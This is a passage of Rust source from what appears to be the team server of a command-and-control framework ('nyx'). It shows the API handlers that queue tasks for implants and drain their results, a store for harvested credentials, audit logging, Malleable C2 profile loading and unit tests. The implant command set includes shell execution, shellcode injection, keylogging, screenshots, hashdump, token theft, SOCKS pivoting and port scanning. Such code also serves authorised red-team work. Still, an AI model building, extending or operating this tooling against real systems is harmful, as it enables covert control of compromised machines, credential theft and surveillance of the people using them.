static CHAN_SEQ: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(1);
fn next_chan() -> u32 {
    CHAN_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

impl JsonCommand {
    /// Convert to a wire [`Command`]. `Upload` decodes its hex payload here; a
    /// malformed hex string is surfaced as an error for a 400 response.
    fn into_command(self) -> Result<Command, &'static str> {
        Ok(match self {
            JsonCommand::Ping => Command::Ping,
            JsonCommand::Shell { args } => Command::Shell { args },
            JsonCommand::Sleep {
                seconds,
                jitter_pct,
            } => Command::Sleep {
                seconds,
                jitter_pct,
            },
            JsonCommand::Upload { name, data_hex } => {
                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::Upload { name, data }
            }
            JsonCommand::Download { path } => Command::Download { path },
            JsonCommand::Bof {
                name,
                args,
                data_hex,
            } => {
                let blob = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::Bof { name, args, blob }
            }
            JsonCommand::FileOp { op, path, dest } => {
                let fileop = match op.as_str() {
                    "cd" => FileOp::Cd,
                    "mkdir" => FileOp::Mkdir,
                    "rm" => FileOp::Rm,
                    "mv" => FileOp::Mv,
                    "cp" => FileOp::Cp,
                    _ => return Err("bad file op"),
                };
                Command::FileOp {
                    op: fileop,
                    path,
                    dest,
                }
            }
            JsonCommand::Connect { host, port } => {
                Command::Connect {
                    proto: 0, // TCP
                    host,
                    port,
                    chan: next_chan(),
                }
            }
            JsonCommand::Socks {
                chan,
                op,
                addr,
                port,
            } => Command::Socks {
                chan,
                op,
                addr,
                port,
            },
            JsonCommand::Screenshot { monitor } => Command::Screenshot { monitor },
            JsonCommand::Portscan { host, ports } => Command::Portscan { host, ports },
            JsonCommand::Net { query } => Command::Net { query },
            JsonCommand::Driveinfo => Command::DriveInfo,
            JsonCommand::Clipboard => Command::Clipboard,
            JsonCommand::Env { name } => Command::Env { name },
            JsonCommand::Keylog { action } => Command::Keylog { action },
            JsonCommand::Screenwatch { interval_secs } => Command::Screenwatch { interval_secs },
            JsonCommand::Hashdump { method } => Command::Hashdump { method },
            JsonCommand::ChannelData { chan, data_hex } => {
                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::ChannelData { chan, data }
            }
            JsonCommand::ChannelClose { chan } => Command::ChannelClose { chan },
            JsonCommand::StealToken { pid } => Command::StealToken { pid },
            JsonCommand::MakeToken {
                domain,
                user,
                password,
                logon_type,
            } => Command::MakeToken {
                domain,
                user,
                password,
                logon_type,
            },
            JsonCommand::Rev2Self => Command::Rev2Self,
            JsonCommand::GetUid => Command::GetUid,
            JsonCommand::Inject {
                method,
                pid,
                spawn_to,
                sc_hex,
            } => {
                let shellcode = hex::decode(&sc_hex).map_err(|_| "invalid hex in sc_hex")?;
                Command::Inject {
                    method,
                    pid,
                    spawn_to,
                    shellcode,
                }
            }
            JsonCommand::Trex => Command::Trex,
            JsonCommand::SetChannel { channel } => Command::SetChannel { channel },
            JsonCommand::Exit => Command::Exit,
        })
    }
}

fn parse_session_hex(s: &str) -> Option<SessionId> {
    // Reject by length BEFORE decoding: a session id is exactly 32 bytes = 64
    // hex chars. hex::decode allocates s.len()/2 bytes upfront, so decoding an
    // arbitrary-length operator/client string first is an allocation bomb
    // (a 4 MB hex string → a 2 MB transient allocation before the length check
    // rejects it).
    if s.len() != 64 {
        return None;
    }
    // Decode directly into a stack array — avoids the transient Vec<u8> heap
    // allocation that hex::decode would create for a known 32-byte output.
    let mut buf = [0u8; 32];
    hex::decode_to_slice(s, &mut buf).ok()?;
    Some(buf)
}

async fn post_task(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<TaskReq>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot task beacons",
        )
            .into_response();
    }
    let id = match parse_session_hex(&req.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let command = match req.command.into_command() {
        Ok(c) => c,
        Err(msg) => return (StatusCode::BAD_REQUEST, msg).into_response(),
    };
    let mut s = match st.sessions.get_mut(&id) {
        Some(s) => s,
        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
    };
    // Back-pressure: refuse to enqueue past the per-session cap so an operator
    // (or a compromised token) can't grow pending unbounded → OOM. The implant
    // drains pending each beacon cycle, so a full queue means the beacon is
    // dead/stuck and queueing more is pointless anyway.
    if s.pending.len() >= MAX_PENDING_PER_SESSION {
        return (
            StatusCode::SERVICE_UNAVAILABLE,
            "pending task queue full (beacon not draining?)",
        )
            .into_response();
    }
    let task_id = s.next_task_id;
    s.next_task_id += 1;
    // 如果是 Connect，把 server 分配的 chan 回传给操作员（供后续 /socks 用）。
    let chan = match &command {
        Command::Connect { chan, .. } => Some(*chan),
        _ => None,
    };
    let cmd_name = command_name(&command);
    // Build the audit detail while `command` is still borrowed (before it is
    // moved into the task below). HIGH-3/5: the previous record dropped ALL
    // command arguments (`{"task_id","command"}`), so post-action forensics
    // could see that a shell task ran but not WHAT it ran. Record a sanitized
    // per-variant summary: shell args are truncated, upload records name +
    // byte count, make-token records DOMAIN\user but NEVER the password.
    let audit_detail = match &command {
        Command::Shell { args } => serde_json::json!({
            "task_id": task_id, "command": "shell", "args": truncate(args, 256)
        }),
        Command::Upload { name, data } => serde_json::json!({
            "task_id": task_id, "command": "upload", "name": name, "bytes": data.len()
        }),
        Command::MakeToken { domain, user, .. } => serde_json::json!({
            "task_id": task_id, "command": "maketoken",
            "user": format!("{}\\{}", domain, user)
        }),
        // BOF execution: log the entry label + string args (truncated), never the
        // raw COFF `blob` (operator-supplied bytes, large, not forensic-relevant).
        Command::Bof { name, args, .. } => {
            let args_t: Vec<String> = args.iter().map(|a| truncate(a, 128)).collect();
            serde_json::json!({
                "task_id": task_id, "command": "bof",
                "name": name, "args": args_t
            })
        }
        // Process injection: log the technique + target pid + sacrificial
        // spawn target, never the `shellcode` bytes (the payload itself).
        Command::Inject {
            method,
            pid,
            spawn_to,
            ..
        } => serde_json::json!({
            "task_id": task_id, "command": "inject",
            "method": method, "pid": pid, "spawn_to": spawn_to
        }),
        Command::Download { path } => serde_json::json!({
            "task_id": task_id, "command": "download", "path": truncate(path, 256)
        }),
        Command::StealToken { pid } => serde_json::json!({
            "task_id": task_id, "command": "stealtoken", "pid": pid
        }),
        // Connect opens an outbound relay: log host:port (and the assigned chan
        // so the operator can correlate), never any token/credential.
        Command::Connect {
            host, port, chan, ..
        } => serde_json::json!({
            "task_id": task_id, "command": "connect",
            "target": format!("{host}:{port}"), "chan": chan
        }),
        Command::Socks { port, chan, .. } => serde_json::json!({
            "task_id": task_id, "command": "socks", "port": port, "chan": chan
        }),
        Command::Portscan { host, ports } => serde_json::json!({
            "task_id": task_id, "command": "portscan",
            "target": truncate(host, 256), "ports": truncate(ports, 128)
        }),
        // FileOp: log the operation kind + path (and dest for mv/cp).
        Command::FileOp { op, path, dest } => {
            let mut detail = serde_json::json!({
                "task_id": task_id, "command": "fileop",
                "op": fileop_label(op), "path": truncate(path, 256)
            });
            if let Some(d) = dest {
                detail["dest"] = serde_json::Value::String(truncate(d, 256));
            }
            detail
        }
        Command::Screenshot { monitor } => serde_json::json!({
            "task_id": task_id, "command": "screenshot", "monitor": monitor
        }),
        Command::Keylog { action } => serde_json::json!({
            "task_id": task_id, "command": "keylog", "action": action
        }),
        _ => serde_json::json!({ "task_id": task_id, "command": cmd_name }),
    };
    // Command::Exit instructs the implant to terminate; fire SessionExit now so
    // operator hooks (`on_session_exit`) actually run. Previously the event was
    // dispatched by the Rhai/tracing hooks but never produced, leaving
    // `on_session_exit` dead code. We snapshot the intent before queuing (the
    // event reflects "this session is exiting now") and fire AFTER dropping the
    // write guard — the same liveness discipline `handle_beacon` uses for
    // ResultReceived — so a slow operator script can't block this session's
    // DashMap shard. `req.session` is the validated hex session id.
    let fire_exit = matches!(command, Command::Exit);
    s.pending.push(Task { task_id, command });
    drop(s);
    if fire_exit {
        st.events.fire(&nyx_scripting::Event::SessionExit(
            nyx_scripting::SessionExit {
                session_id: req.session.clone(),
            },
        ));
    }
    if let Some(audit) = &st.audit {
        audit.append("task", &op.name, &req.session, audit_detail);
    }
    (StatusCode::OK, Json(TaskAck { task_id, chan })).into_response()
}

#[derive(Deserialize)]
struct ResultsQuery {
    session: String,
}

async fn get_results(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<ResultsQuery>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot drain results",
        )
            .into_response();
    }
    let id = match parse_session_hex(&q.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let drained = match st.sessions.get_mut(&id) {
        Some(mut s) => std::mem::take(&mut s.results),
        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
    };
    let views: Vec<ResultView> = drained
        .into_iter()
        .map(|r| {
            let (kind, text, data_hex, seq, eof) = match r.response {
                MsgResponse::Output(b) => (
                    "output",
                    String::from_utf8_lossy(&b).into_owned(),
                    None,
                    None,
                    None,
                ),
                MsgResponse::Ok => ("ok", String::new(), None, None, None),
                MsgResponse::Err(m) => ("error", m, None, None, None),
                MsgResponse::FileChunk {
                    name,
                    seq,
                    eof,
                    data,
                } => (
                    "file",
                    format!("<chunk {name}#{seq}>"),
                    Some(hex::encode(&data)),
                    Some(seq),
                    Some(eof),
                ),
                MsgResponse::BofOutput(b) => (
                    "bof",
                    String::from_utf8_lossy(&b).into_owned(),
                    None,
                    None,
                    None,
                ),
                MsgResponse::Channel { chan, status, data } => (
                    "channel",
                    format!("<chan {chan}#{status}>"),
                    Some(hex::encode(&data)),
                    None,
                    None,
                ),
                MsgResponse::Image(d) => (
                    "image",
                    format!("<screenshot {} bytes>", d.len()),
                    Some(hex::encode(&d)),
                    None,
                    None,
                ),
            };
            ResultView {
                task_id: r.task_id,
                kind: kind.to_string(),
                text,
                data_hex,
                seq,
                eof,
            }
        })
        .collect();
    (StatusCode::OK, Json(views)).into_response()
}

// ---- /api/creds — Phase 2 persistent credential store ---------------------

#[derive(Deserialize)]
struct CredsQuery {
    /// `?reveal=1` returns cleartext secrets; the default MASKS them so a list
    /// GET never sprays every harvested hash to a glance.
    #[serde(default)]
    reveal: Option<u8>,
    /// Optional `?kind=hash|password|ticket|key` filter.
    #[serde(default)]
    kind: Option<String>,
}

/// `GET /api/creds` — list stored credentials. Secrets masked unless `?reveal=1`.
async fn list_creds(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<CredsQuery>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if q.reveal.unwrap_or(0) == 1 && op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot reveal plaintext secrets",
        )
            .into_response();
    }
    let mut rows = match st.creds.list() {
        Ok(r) => r,
        Err(e) => {
            tracing::error!(error = %e, "cred store list failed");
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("cred store: {e}"),
            )
                .into_response();
        }
    };
    if let Some(k) = &q.kind {
        if let Some(want) = nyx_store::CredKind::from_label(k) {
            rows.retain(|r| r.kind == want);
        }
    }
    if q.reveal.unwrap_or(0) != 1 {
        for r in &mut rows {
            r.secret = nyx_store::mask_secret(&r.secret);
        }
    }
    (StatusCode::OK, Json(rows)).into_response()
}

/// `POST /api/creds` — upsert a credential (add OR update-in-place by
/// `(realm, user, kind)` — CS parity: a re-dump overwrites the old secret).
async fn post_creds(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(rec): Json<nyx_store::CredRecord>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot add credentials",
        )
            .into_response();
    }
    match st.creds.upsert(&rec) {
        Ok(()) => {
            if let Some(audit) = &st.audit {
                audit.append(
                    "cred_add",
                    &op.name,
                    &format!("{}\\{}", rec.realm, rec.user),
                    serde_json::json!({ "kind": rec.kind.label() }),
                );
            }
            (
                StatusCode::OK,
                Json(serde_json::json!({
                    "ok": true,
                    "key": [rec.realm, rec.user, rec.kind.label()]
                })),
            )
                .into_response()
        }
        Err(e) => {
            tracing::error!(error = %e, "cred store upsert failed");
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("cred store: {e}"),
            )
                .into_response()
        }
    }
}

#[derive(Deserialize)]
struct CredKey {
    realm: String,
    user: String,
    kind: String,
}

/// `POST /api/creds/delete` — delete by composite key (JSON body, to avoid
/// path-encoding realm/user).
async fn delete_cred(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(key): Json<CredKey>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot delete credentials",
        )
            .into_response();
    }
    let kind = match nyx_store::CredKind::from_label(&key.kind) {
        Some(k) => k,
        None => return (StatusCode::BAD_REQUEST, "bad kind").into_response(),
    };
    match st.creds.delete(&key.realm, &key.user, kind) {
        Ok(deleted) => {
            if let Some(audit) = &st.audit {
                audit.append(
                    "cred_delete",
                    &op.name,
                    &format!("{}\\{}", key.realm, key.user),
                    serde_json::json!({ "kind": kind.label(), "deleted": deleted }),
                );
            }
            (
                StatusCode::OK,
                Json(serde_json::json!({ "deleted": deleted })),
            )
                .into_response()
        }
        Err(e) => {
            tracing::error!(error = %e, "cred store delete failed");
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("cred store: {e}"),
            )
                .into_response()
        }
    }
}

/// `GET /api/audit` — query the action audit log. Admin-only for the full log;
/// a non-admin operator is restricted to their OWN records (server-enforced
/// regardless of the `?operator=` query). 401 on no/bad auth.
async fn get_audit(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(mut q): Query<audit::AuditQuery>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    let Some(audit) = &st.audit else {
        return (StatusCode::OK, Json(Vec::<audit::AuditRecord>::new())).into_response();
    };
    if op.role != operators::Role::Admin {
        q.operator = Some(op.name.clone());
    }
    match audit.query(&q) {
        Ok(rows) => (StatusCode::OK, Json(rows)).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response(),
    }
}

/// `GET /api/audit/verify` — walk the hash-chain. `{ "ok": bool, "broken_at": Option<u64> }`.
async fn verify_audit(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot verify audit log",
        )
            .into_response();
    }
    let Some(audit) = &st.audit else {
        return (StatusCode::OK, Json(serde_json::json!({ "ok": true }))).into_response();
    };
    let broken = match audit::AuditWriter::verify_chain(audit.path()) {
        Ok(b) => b,
        Err(e) => {
            return (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response()
        }
    };
    (
        StatusCode::OK,
        Json(serde_json::json!({ "ok": broken.is_none(), "broken_at": broken })),
    )
        .into_response()
}

/// Lowercase label for a [`FileOp`] (for the audit log's `op` field).
fn fileop_label(op: &FileOp) -> &'static str {
    match op {
        FileOp::Cd => "cd",
        FileOp::Mkdir => "mkdir",
        FileOp::Rm => "rm",
        FileOp::Mv => "mv",
        FileOp::Cp => "cp",
    }
}

/// Short name for a wire [`Command`] variant (for operator-facing views).
fn command_name(c: &Command) -> &'static str {
    match c {
        Command::Ping => "ping",
        Command::Sleep { .. } => "sleep",
        Command::Shell { .. } => "shell",
        Command::Upload { .. } => "upload",
        Command::Download { .. } => "download",
        Command::Bof { .. } => "bof",
        Command::Connect { .. } => "connect",
        Command::Socks { .. } => "socks",
        Command::FileOp { .. } => "fileop",
        Command::Screenshot { .. } => "screenshot",
        Command::Portscan { .. } => "portscan",
        Command::Net { .. } => "net",
        Command::DriveInfo => "driveinfo",
        Command::Clipboard => "clipboard",
        Command::Env { .. } => "env",
        Command::Keylog { .. } => "keylog",
        Command::Screenwatch { .. } => "screenwatch",
        Command::Hashdump { .. } => "hashdump",
        Command::ChannelData { .. } => "channeldata",
        Command::ChannelClose { .. } => "channelclose",
        Command::StealToken { .. } => "stealtoken",
        Command::MakeToken { .. } => "maketoken",
        Command::Rev2Self => "rev2self",
        Command::GetUid => "getuid",
        Command::Inject { .. } => "inject",
        Command::Trex => "trex",
        Command::SetChannel { .. } => "setchannel",
        Command::Exit => "exit",
    }
}

/// `GET /api/tasks?session=<hex>` — the pending task queue for a session.
async fn get_tasks(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<ResultsQuery>,
) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let id = match parse_session_hex(&q.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let views: Vec<TaskView> = match st.sessions.get(&id) {
        Some(s) => s
            .pending
            .iter()
            .map(|t| TaskView {
                task_id: t.task_id,
                command: command_name(&t.command).to_string(),
            })
            .collect(),
        None => Vec::new(),
    };
    Json(views).into_response()
}

/// `GET /api/profile` — the active Malleable C2 profile summary (or `loaded:
/// false`). Lets an operator / the Tauri client see what's shaping traffic.
async fn get_profile(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let view = ProfileView {
        loaded: st.profile.is_some(),
        http_get_uri: st
            .profile
            .as_ref()
            .and_then(|p| p.http_get())
            .and_then(|b| b.get("uri"))
            .map(|u| u.as_str().into_owned()),
        http_post_uri: st
            .profile
            .as_ref()
            .and_then(|p| p.http_post())
            .and_then(|b| b.get("uri"))
            .map(|u| u.as_str().into_owned()),
        useragent: st
            .profile
            .as_ref()
            .and_then(|p| p.option("useragent"))
            .map(|u| u.as_str().into_owned()),
    };
    Json(view).into_response()
}

#[cfg(test)]
mod tests {
    use super::*;

    const MIN_PROFILE: &str = r#"http-get { set uri "/api/v1/Updates"; client { metadata { header "Cookie"; } } server { output { print; } } } http-post { set uri "/api/v1/Telemetry"; client { output { print; } } server { output { print; } } }"#;

    #[test]
    fn load_profile_accepts_valid() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("ok.profile");
        std::fs::write(&path, MIN_PROFILE).unwrap();
        let p = load_profile(&path).expect("valid profile must load + lint clean");
        assert_eq!(
            p.http_post().unwrap().get("uri").unwrap().as_str(),
            "/api/v1/Telemetry"
        );
    }

    #[test]
    fn load_profile_rejects_lint_errors() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad.profile");
        // missing http-get -> c2lint error
        std::fs::write(
            &path,
            r#"http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
        )
        .unwrap();
        assert!(
            load_profile(&path).is_err(),
            "a profile with lint errors must be rejected"
        );
    }

    #[test]
    fn keypair_persists_across_restart() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("server.key");
        let kp1 = load_or_create_keypair(&path).expect("create keypair");
        assert!(path.exists(), "keyfile must be created");
        let pub1 = kp1.public_bytes();
        // A second load must restore the SAME identity (sessions survive restart).
        let kp2 = load_or_create_keypair(&path).expect("reload keypair");
        assert_eq!(
            kp2.public_bytes(),
            pub1,
            "reloading the keyfile must restore the same identity"
        );
    }

    #[test]
    fn load_script_compiles_valid_and_rejects_bad() {
        let dir = tempfile::tempdir().unwrap();
        let good = dir.path().join("ok.rhai");
        std::fs::write(&good, r#"fn on_session_new(s) { nyx_log(s["hostname"]); }"#).unwrap();
        assert!(load_script(&good).is_ok(), "valid Rhai script must compile");

        let bad = dir.path().join("bad.rhai");
        std::fs::write(&bad, "fn ( broken").unwrap();
        assert!(
            load_script(&bad).is_err(),
            "a syntactically broken script must be rejected"
        );
    }

    #[test]
    fn parse_session_hex_rejects_wrong_length_without_allocating() {
        // A session id is exactly 32 bytes = 64 hex chars. The parser must
        // reject any other length WITHOUT first calling hex::decode on the whole
        // string (which would allocate s.len()/2 bytes — an allocation bomb when
        // an operator/client sends a multi-MB hex string). Pin: wrong lengths
        // return None, and a gigantic string doesn't blow up.
        // 64 valid hex chars → 32 bytes → Some.
        let valid = "00".repeat(32);
        assert!(parse_session_hex(&valid).is_some());
        // Odd length, too short, too long, empty, non-hex — all None.
        assert!(parse_session_hex("00").is_none());
        assert!(parse_session_hex(&"0".repeat(63)).is_none());
        assert!(parse_session_hex(&"0".repeat(65)).is_none());
        assert!(parse_session_hex("").is_none());
        assert!(parse_session_hex(&"z".repeat(64)).is_none());
        // The allocation-bomb regression: a 4 MB hex string must NOT cause a
        // ~2 MB allocation before being rejected. We can't directly measure the
        // alloc, but if parse_session_hex short-circuits on length first, this
        // is essentially free; if it decodes first, it's a 2 MB transient.
        let huge = "ab".repeat(2 * 1024 * 1024); // 4 MB string, wrong length anyway
        assert!(parse_session_hex(&huge).is_none());
        // And a length-64-but-non-hex string is rejected by decode, not length.
        assert!(parse_session_hex(&'z'.to_string().repeat(64)).is_none());
    }

    #[test]
    fn constant_time_eq_handles_length_mismatch_and_content_diffs() {
        // A timing-constant compare can't be proven by a black-box test, but we
        // CAN pin the correctness contract that must hold for the length-tolerant
        // implementation: it must return the right answer for length-mismatched
        // inputs (no short-circuit returning a wrong `true`) and for every
        // single-byte difference. The actual constant-time guarantee is upheld
        // by the implementation scanning min(len) bytes and OR-ing in a length
        // flag — reviewed, not tested.
        let eq = |a: &[u8], b: &[u8]| constant_time_eq(a, b);
        // equal
        assert!(eq(b"secret-token", b"secret-token"));
        assert!(eq(b"", b""));
        // length mismatch — must be false even with a matching prefix
        assert!(!eq(b"abc", b"abcd"));
        assert!(!eq(b"abcd", b"abc"));
        assert!(!eq(b"", b"x"));
        assert!(!eq(b"x", b""));
        // length difference > 255 must NOT collide with equal-length via a
        // truncated low-byte length check (regression for an earlier impl that
        // did `(a.len() ^ b.len()) as u8`, where 256 xor 0 → 0).
        assert!(!eq(&vec![0u8; 256], &[] as &[u8]));
        assert!(!eq(&vec![0u8; 512], &vec![0u8; 256]));
        // same length, every single-byte difference must be detected
        for i in 0..32u8 {
            let mut a = vec![0u8; 32];
            let mut b = vec![0u8; 32];
            a[i as usize] = 1;
            assert!(!eq(&a, &b), "diff at byte {i} must compare unequal");
            b[i as usize] = 1;
            assert!(eq(&a, &b), "re-equalized at byte {i} must compare equal");
        }
    }

    #[test]
    fn generate_api_token_is_64_hex_chars_and_unique() {
        // P0-2: the auto-generated control-API token must be 256 bits of OS
        // CSPRNG entropy (32 bytes → 64 hex chars), all-lowercase-hex, and two
        // draws must not collide (a collision would imply a broken RNG).
        let t1 = generate_api_token();
        let t2 = generate_api_token();
        assert_eq!(
            t1.len(),
            64,
            "token must be 32 bytes hex-encoded (64 chars)"
        );
        assert_eq!(t2.len(), 64);
        assert!(
            t1.bytes().all(|b| b.is_ascii_hexdigit()),
            "token must be hex"
        );
        assert_ne!(t1, t2, "two OsRng draws must differ");
        // Neither all-zero (would indicate a failed/zeroed CSPRNG fill).
        assert_ne!(t1, "0".repeat(64));
    }

    #[test]
    fn is_loopback_bind_classifies_common_addresses() {
        // P0-2: loopback binds are safe to run without a token; anything else
        // triggers the auto-token footgun guard. Cover IPv4 loopback, localhost,
        // and IPv6 ::1 (bracketed with port and bare) — plus the network case.
        assert!(is_loopback_bind("127.0.0.1:8443"));
        assert!(is_loopback_bind("127.0.1.5:8443")); // entire 127.0.0.0/8
        assert!(is_loopback_bind("localhost:8443"));
        assert!(is_loopback_bind("[::1]:8443"));
        // network-reachable binds → NOT loopback
        assert!(!is_loopback_bind("0.0.0.0:8443"));
        assert!(!is_loopback_bind("10.0.0.5:8443"));
        assert!(!is_loopback_bind("192.168.1.10:8443"));
    }

    #[test]
    fn is_loopback_bind_closes_v030_string_prefix_bypasses() {
        // v0.3.0 string-prefix matching was bypassable in two directions:
        //   (a) FALSE NEGATIVE: `localhost.localdomain`, `::ffff:127.0.0.1`,
        //       hostnames that getaddrinfo resolves to loopback — these were
        //       treated as non-loopback (conservative; safe direction).
        //   (b) FALSE POSITIVE: `::1:8443` (bare IPv6 without brackets) parsed
        //       the literal `::1` as `1` (hex) by some resolvers, which is NOT
        //       loopback, but the v0.3.0 `starts_with("::1")` matched it as
        //       loopback — shipping an OPEN team server.
        // The v0.3.1 parser delegates to IpAddr::is_loopback, which is
        // authoritative for both directions.

        // Loopback cases the v0.3.0 matcher handled correctly — still pass.
        assert!(is_loopback_bind("127.0.0.1:8443"));
        assert!(is_loopback_bind("localhost:8443"));
        assert!(is_loopback_bind("LOCALHOST:8443")); // case-insensitive
        assert!(is_loopback_bind("localhost.:8443")); // trailing dot (DNS form)
        assert!(is_loopback_bind("[::1]:8443"));
        // NOTE: ::ffff:127.0.0.1 (v4-mapped IPv6) is intentionally NOT treated
        // as loopback here — std::net::Ipv6Addr::is_loopback only matches ::1,
        // and adding a special case would expand the loopback surface beyond
        // what the std lib considers authoritative. Operators binding to a
        // v4-mapped address should set NYX_ALLOW_OPEN or pass an explicit token.

        // Network-reachable binds that v0.3.0 mis-classified as loopback.
        // `localhost.localdomain` is NOT `localhost` — must trigger auto-token.
        assert!(!is_loopback_bind("localhost.localdomain:8443"));
        // `0.0.0.0` and `[::]` bind to ALL interfaces — never loopback.
        assert!(!is_loopback_bind("0.0.0.0:8443"));
        assert!(!is_loopback_bind("[::]:8443"));
        // Unparseable input → fail-closed (treat as network, auto-token).
        assert!(!is_loopback_bind("garbage"));
        assert!(!is_loopback_bind(""));
    }

    #[test]
    fn truncate_passes_short_and_cuts_long_with_ellipsis() {
        // HIGH-3: audit-log arg capture must be bounded. Short input passes
        // through unchanged; long input is cut to `max` chars + a trailing
        // ellipsis so a reviewer can tell it was truncated.
        assert_eq!(truncate("ls -la", 256), "ls -la");
        assert_eq!(truncate("", 256), "");
        let big = "A".repeat(300);
        let t = truncate(&big, 10);
        assert_eq!(t.chars().count(), 11, "10 chars + ellipsis");
        assert!(t.ends_with('…'));
        assert!(t.starts_with("AAAAAAAAAA"));
        // exactly `max` chars → unchanged (no ellipsis on the boundary)
        let exact = "B".repeat(10);
        assert_eq!(truncate(&exact, 10), exact);
    }

    // ---- JsonCommand → Command 映射（FileOp / Connect / Socks）----

    #[test]
    fn fileop_mkdir_maps() {
        let cmd = JsonCommand::FileOp {
            op: "mkdir".into(),
            path: "/tmp/x".into(),
            dest: None,
        }
        .into_command()
        .expect("mkdir 应映射成功");
        assert!(matches!(
            cmd,
            Command::FileOp {
                op: FileOp::Mkdir,
                ..
            }
        ));
    }

    #[test]
    fn fileop_mv_maps_with_dest() {
        let cmd = JsonCommand::FileOp {
            op: "mv".into(),
            path: "a".into(),
            dest: Some("b".into()),
        }
        .into_command()
        .unwrap();
        assert!(matches!(
            cmd,
            Command::FileOp { op: FileOp::Mv, path, dest: Some(_) } if path == "a"
        ));
    }

    #[test]
    fn fileop_bad_op_errors() {
        assert!(matches!(
            JsonCommand::FileOp {
                op: "wat".into(),
                path: "x".into(),
                dest: None
            }
            .into_command(),
            Err("bad file op")
        ));
    }

    #[test]
    fn connect_maps_with_chan() {
        let cmd = JsonCommand::Connect {
            host: "10.0.0.1".into(),
            port: 445,
        }
        .into_command()
        .unwrap();
        match cmd {
            Command::Connect {
                host, port, chan, ..
            } => {
                assert_eq!(host, "10.0.0.1");
                assert_eq!(port, 445);
                assert!(chan > 0, "chan 必须由 server 分配，>0");
            }
            _ => panic!("应为 Connect"),
        }
    }

    #[test]
    fn socks_maps_passthrough() {
        let cmd = JsonCommand::Socks {
            chan: 5,
            op: 1,
            addr: "1.2.3.4".into(),
            port: 80,
        }
        .into_command()
        .unwrap();
        assert!(matches!(cmd, Command::Socks { chan: 5, op: 1, .. }));
    }

    // ---- Session persistence (SQLite durability layer) ----------------------
    //
    // The registry must survive a team-server restart. These pin the contract:
    // (1) a check-in writes a metadata row to the store; (2) loading persisted
    // rows into a fresh registry marks them `stale`; (3) the first live check-in
    // after a restart clears `stale`; (4) the existing-session touch is throttled
    // (no more than one last_seen write per session per PERSIST_TOUCH_THROTTLE).

    /// Build an AppState whose session persistence points at an in-memory store
    /// and a spawned writer thread. Returns the state and a handle to the store
    /// for direct synchronous querying (the writer is async/fire-and-forget).
    fn state_with_persistence() -> (
        std::sync::Arc<AppState>,
        std::sync::Arc<nyx_store::SessionStore>,
    ) {
        let store = std::sync::Arc::new(nyx_store::SessionStore::open_in_memory().unwrap());
        let persist = SessionPersistence::spawn(store.clone());
        let st = std::sync::Arc::new(AppState {
            sessions_db: Some(std::sync::Arc::new(persist)),
            ..AppState::default()
        });
        (st, store)
    }

    #[test]
    fn checkin_persists_session_to_store() {
        // A new-session check-in must upsert a metadata row into the persistent
        // store (fire-and-forget, applied by the background thread).
        let (st, store) = state_with_persistence();
        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7801".parse().unwrap();
